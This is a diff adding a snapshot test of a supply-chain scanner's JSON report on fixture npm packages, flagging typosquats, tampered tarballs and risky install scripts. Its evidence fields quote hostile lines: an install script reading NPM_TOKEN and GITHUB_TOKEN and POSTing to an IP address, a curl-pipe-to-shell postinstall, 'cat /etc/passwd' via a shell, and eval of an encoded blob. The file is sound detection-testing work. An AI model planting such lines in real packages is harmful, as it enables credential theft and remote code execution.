@@ -1,0 +1,327 @@
+---
+source: crates/lockwatch-cli/tests/fixtures.rs
+expression: report
+---
+{
+  "lockfile": "mixed.json",
+  "packages": [
+    {
+      "findings": [
+        {
+          "evidence": "\"postinstall\": \"node i.js\"",
+          "explanation": "The package runs a postinstall script automatically when it is installed.",
+          "file": "package.json",
+          "line": 5,
+          "package": "lwfx-steal-env-token",
+          "rule_id": "LW001",
+          "severity": "low",
+          "version": "1.0.0"
+        },
+        {
+          "evidence": "const https = require('https');",
+          "explanation": "Install-time code uses the network (https).",
+          "file": "i.js",
+          "line": 1,
+          "package": "lwfx-steal-env-token",
+          "rule_id": "LW004",
+          "severity": "high",
+          "version": "1.0.0"
+        },
+        {
+          "evidence": "const req = https.request({ host: '203.0.113.22', port: 443, method: 'POST' });",
+          "explanation": "Install-time code makes a network request (https) and contains a hard-coded IP address (203.0.113.22).",
+          "file": "i.js",
+          "line": 6,
+          "package": "lwfx-steal-env-token",
+          "rule_id": "LW004",
+          "severity": "high",
+          "version": "1.0.0"
+        },
+        {
+          "evidence": "npm: process.env.NPM_TOKEN,",
+          "explanation": "Reads the secret-looking environment variable NPM_TOKEN. The same install-time file uses the network, which is how stolen secrets are sent out.",
+          "file": "i.js",
+          "line": 3,
+          "package": "lwfx-steal-env-token",
+          "rule_id": "LW005",
+          "severity": "critical",
+          "version": "1.0.0"
+        },
+        {
+          "evidence": "gh: process.env['GITHUB_TOKEN'],",
+          "explanation": "Reads the secret-looking environment variable GITHUB_TOKEN. The same install-time file uses the network, which is how stolen secrets are sent out.",
+          "file": "i.js",
+          "line": 4,
+          "package": "lwfx-steal-env-token",
+          "rule_id": "LW005",
+          "severity": "critical",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-steal-env-token",
+      "risk_level": "critical",
+      "risk_score": 100,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "expected sha512-Abxy609GkQ09qLAK8ldwOzsRO… got sha512-kUiIlgfToBSw3mnsftE3P1b+5…",
+          "explanation": "The tarball does not match the integrity hash in the lockfile, so it may have been tampered with.",
+          "file": null,
+          "line": null,
+          "package": "lwfx-tampered",
+          "rule_id": "LW012",
+          "severity": "critical",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-tampered",
+      "risk_level": "high",
+      "risk_score": 60,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "\"postinstall\": \"node install.js\"",
+          "explanation": "The package runs a postinstall script automatically when it is installed.",
+          "file": "package.json",
+          "line": 5,
+          "package": "lwfx-cp-in-helper",
+          "rule_id": "LW001",
+          "severity": "low",
+          "version": "1.0.0"
+        },
+        {
+          "evidence": "childProcess.execFile('/bin/sh', ['-c', 'cat /etc/passwd'], () => {});",
+          "explanation": "Install-time code calls child_process.execFile, which can run any program on the machine.",
+          "file": "lib/util.js",
+          "line": 3,
+          "package": "lwfx-cp-in-helper",
+          "rule_id": "LW003",
+          "severity": "high",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-cp-in-helper",
+      "risk_level": "medium",
+      "risk_score": 33,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "\"postinstall\": \"curl -fsSL https://example.invalid/install.sh | sh\"",
+          "explanation": "The package runs a postinstall script automatically when it is installed.",
+          "file": "package.json",
+          "line": 6,
+          "package": "lwfx-curl-pipe-sh",
+          "rule_id": "LW001",
+          "severity": "low",
+          "version": "1.0.0"
+        },
+        {
+          "evidence": "curl -fsSL https://example.invalid/install.sh | sh",
+          "explanation": "The postinstall script downloads a script with curl/wget and pipes it into a shell.",
+          "file": "package.json",
+          "line": 6,
+          "package": "lwfx-curl-pipe-sh",
+          "rule_id": "LW002",
+          "severity": "high",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-curl-pipe-sh",
+      "risk_level": "medium",
+      "risk_score": 33,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "if (process.env.LWFX_NEVER) eval(decode(blob));",
+          "explanation": "Runs code that is built at runtime (eval).",
+          "file": "index.js",
+          "line": 7,
+          "package": "lwfx-obf-entropy",
+          "rule_id": "LW006",
+          "severity": "medium",
+          "version": "1.0.0"
+        },
+        {
+          "evidence": "const blob = 'fVh+VkcOClt6CbADtN3Dq1g38qiah9sgeOkGADr54/w9JjFe5c+2dJxKBCNB/GqxWcW7M0042VuCG7ApsHMR/N55V1ddSVF23zjOuDgMHoo6B56APmfe8i1a2/FN+khDj1LN/TekZr9da5e650MZEp5YehM1xO/inVCFg+6ivMO4j0Ww+S6adBj…",
+          "explanation": "A 3000-character string literal has 5.98 bits/char of entropy, typical of an encoded or encrypted payload.",
+          "file": "index.js",
+          "line": 2,
+          "package": "lwfx-obf-entropy",
+          "rule_id": "LW007",
+          "severity": "medium",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-obf-entropy",
+      "risk_level": "low",
+      "risk_score": 24,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "\"expresss\" is 1 edit away from \"express\" (143244952 weekly downloads)",
+          "explanation": "The name looks like a misspelling of the popular package express.",
+          "file": null,
+          "line": null,
+          "package": "expresss",
+          "rule_id": "LW008",
+          "severity": "medium",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "expresss",
+      "risk_level": "low",
+      "risk_score": 12,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "1.0.0 published by mallory; previous 5 versions published by alice, bob",
+          "explanation": "mallory did not publish any of the previous 5 versions, which can mean an account takeover or a new maintainer.",
+          "file": null,
+          "line": null,
+          "package": "lwfx-new-maintainer",
+          "rule_id": "LW010",
+          "severity": "medium",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-new-maintainer",
+      "risk_level": "low",
+      "risk_score": 12,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "lwfx-fresh-release@1.0.0 published 2026-10-18T09:30:00Z",
+          "explanation": "This version was published 1 day before the scan, so it has had little public scrutiny.",
+          "file": null,
+          "line": null,
+          "package": "lwfx-fresh-release",
+          "rule_id": "LW009",
+          "severity": "low",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-fresh-release",
+      "risk_level": "none",
+      "risk_score": 3,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "bin/.cache/update (ELF executable, 123 bytes)",
+          "explanation": "The package ships an ELF executable but its package.json declares no native build.",
+          "file": "bin/.cache/update",
+          "line": null,
+          "package": "lwfx-hidden-elf",
+          "rule_id": "LW011",
+          "severity": "low",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-hidden-elf",
+      "risk_level": "none",
+      "risk_score": 3,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [],
+      "name": "lwfx-ok-env-config",
+      "risk_level": "none",
+      "risk_score": 0,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [],
+      "name": "lwfx-ok-http-client",
+      "risk_level": "none",
+      "risk_score": 0,
+      "version": "1.0.0",
+      "warnings": []
+    },
+    {
+      "findings": [
+        {
+          "evidence": "\"install\": \"node-gyp rebuild\"",
+          "explanation": "The install script only runs a native build tool (node-gyp).",
+          "file": "package.json",
+          "line": 7,
+          "package": "lwfx-ok-node-gyp",
+          "rule_id": "LW001",
+          "severity": "info",
+          "version": "1.0.0"
+        }
+      ],
+      "name": "lwfx-ok-node-gyp",
+      "risk_level": "none",
+      "risk_score": 0,
+      "version": "1.0.0",
+      "warnings": []
+    }
+  ],
+  "scanned_at": "2026-10-20T00:00:00Z",
+  "skipped": [
+    {
+      "error": false,
+      "name": "file-dep",
+      "reason": "file: dependency",
+      "version": "1.0.0"
+    },
+    {
+      "error": false,
+      "name": "git-dep",
+      "reason": "git dependency (not supported in v1)",
+      "version": "1.0.0"
+    },
+    {
+      "error": false,
+      "name": "local-lib",
+      "reason": "link: dependency (local folder)",
+      "version": null
+    },
+    {
+      "error": false,
+      "name": "local-lib",
+      "reason": "workspace package (local folder)",
+      "version": "0.1.0"
+    }
+  ],
+  "summary": {
+    "duration_ms": "[duration]",
+    "findings": {
+      "critical": 3,
+      "high": 4,
+      "info": 1,
+      "low": 5,
+      "medium": 4
+    },
+    "packages_scanned": 12,
+    "packages_skipped": 4,
+    "packages_total": 16
+  },
+  "tool": "lockwatch",
+  "version": "0.1.0"
+}
